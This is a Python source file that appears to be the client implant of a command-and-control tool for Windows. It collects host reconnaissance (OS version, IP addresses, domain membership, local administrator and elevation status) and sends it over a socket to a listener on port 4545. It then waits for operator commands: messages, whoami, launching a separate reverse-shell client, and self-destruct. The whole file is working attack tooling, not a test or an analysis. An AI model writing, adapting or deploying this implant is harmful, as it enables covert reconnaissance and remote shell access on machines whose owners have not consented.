import socket
import subprocess
import threading
import os
import time
import ctypes
exit_event = threading.Event()

def is_session_running_as_admin():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
        else:
            return False
    except:
        return False

def startrevshellcli():
    subprocess.call(["py", "pyrevshell_client.py"])
    exit_event.set()

host = "127.0.0.1"
port = 4545
breaktheloop = False

OnADomain = False
LocalAdmin = False

osinfo=subprocess.run("powershell.exe -command \"Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version\" | findstr Microsoft", capture_output=True, text=True)
osinfo=osinfo.stdout.strip()

try:
    ipaddrinfo=subprocess.run("powershell.exe -command \"(Get-NetIPAddress -AddressFamily IPv4).IPAddress\" | findstr /V 169. | findstr /V 127.0.0.1", capture_output=True, text=True)
    ipaddrinfo=ipaddrinfo.stdout.strip()
except:
    ipaddrinfo="No IP Addresses Found"

try:
    # Test if device is domain joined
    domaininfo=subprocess.run("whoami /FQDN", capture_output=True, text=True)
    if "Unable" in domaininfo.stderr:
        OnADomain = False
        print("[-] Host is NOT domain joined")
    else:
        print("[+] Host is domain joined")
        OnADomain = True
except:
    print("[!] Unexpected Error...")

userinfo = subprocess.run("net user " + os.environ.get('USERNAME'), capture_output=True, text=True)

if "Administrators" in userinfo.stdout:
    print("[+] Current session has Local Admin membership!")
    LocalAdmin = True

if OnADomain:
    info = "Current Session User: " + os.environ["userdomain"] + "\\" + os.getlogin() + "\n[Elevated Shell]: " + str(is_session_running_as_admin()) + "\nMember of Local Admins: " + str(LocalAdmin) + "\nDomain Joined: True\nDomain Info: " + domaininfo.stdout + "\nOS info: " + osinfo + "\nIP Addresses:\n" + ipaddrinfo
else:
    info = "Current Session User: " + os.environ.get('COMPUTERNAME') + "\\" + os.getlogin() + "\n[Elevated Shell]: " + str(is_session_running_as_admin()) + "\nMember of Local Admins: " + str(LocalAdmin) + "\nDomain Joined: False\nOS info: " + osinfo + "\nIP Addresses:\n" + ipaddrinfo

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host, port))
client.send(info.encode('UTF-8'))

def reciever(client):
    while True:
        try:
            data = client.recv(1024)
        except:
            print("[!] Server must have died... Time to disconnect...")
            client.close()
            os._exit(0)

        data=data.decode('UTF-8')
 
        if ":msg:" in data:
            print(data)
        if ":whoami:" in data:
            whoami=os.getlogin()
            client.send(whoami.encode())
        if ":shell:" in data:
            exit_event.clear()
            
            handler_thread2 = threading.Thread(target=startrevshellcli)
            handler_thread2.daemon = True
            handler_thread2.start()

            while not exit_event.is_set():
                time.sleep(1)
        if ":self-destruct:" in data:
            client.close()
            os._exit(0)

handler_thread = threading.Thread(target=reciever, args=(client, ))
handler_thread.daemon = True
handler_thread.start()

while True:
    time.sleep(1)